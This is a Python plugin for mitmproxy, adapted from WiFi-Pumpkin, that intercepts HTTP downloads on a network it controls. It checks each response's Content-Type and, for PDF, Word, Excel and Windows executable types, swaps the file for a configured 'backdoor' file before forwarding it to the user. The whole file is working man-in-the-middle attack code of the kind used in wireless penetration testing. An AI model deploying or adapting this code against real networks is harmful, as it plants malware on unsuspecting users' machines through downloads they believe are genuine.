"""
This module is an adapted copy of Wifi-Pumpkin's downloadspoof.py plugin developped by Marcos Nesster
https://github.com/P0cL4bs/WiFi-Pumpkin/blob/master/plugins/extension/downloadspoof.py

The adaptation is necessary because Wifi-Pumpkin uses a very 
outdated version of mitmproxy which still supported direct scripting.
"""
from os import path
from mitmproxy import ctx
from mitmproxy.models import decoded
from mitmplugin import MITMPlugin


exe_mimetypes = [   
                    'application/octet-stream', 'application/x-msdownload', 
                    'application/exe', 'application/x-exe', 'application/dos-exe', 'vms/exe',
                    'application/x-winexe', 'application/msdos-windows', 'application/x-msdos-program'
                ]

class DownloadReplacer(MITMPlugin):

    def __init__(self):
        super(DownloadReplacer, self).__init__("downloadreplacer")
        self.backdoors = {
                            'application/pdf'       : self.get_config('pdf_backdoor'),
                            'application/msword'    : self.get_config('doc_backdoor'),
                            'application/x-msexcel' : self.get_config('xls_backdoor')
                         }

        for mtype in exe_mimetypes:
            self.backdoors[mtype] = self.get_config('exe_backdoor')

    def response(self, flow):
        try:
            # for another format file types
            content = flow.response.headers['Content-Type']
            if content in self.backdoors:
                if path.isfile(self.backdoors[content]):
                    with decoded(flow.response): 
                        print "[{}]:: URL: {}".format(self.name, flow.request.url)
                        flow.response.content = open(self.backdoors[content],'rb').read()
                        print "[{}]:: Replaced file of mimtype {} with malicious version".format(self.name, content)
                        print "[{}]:: Replacement complete, forwarding to user...".format(self.name)
                    return 
                print "[{}]:: {}, Error Path file not found\n".format(self.name, self.backdoors[content])
        except Exception as e:
            pass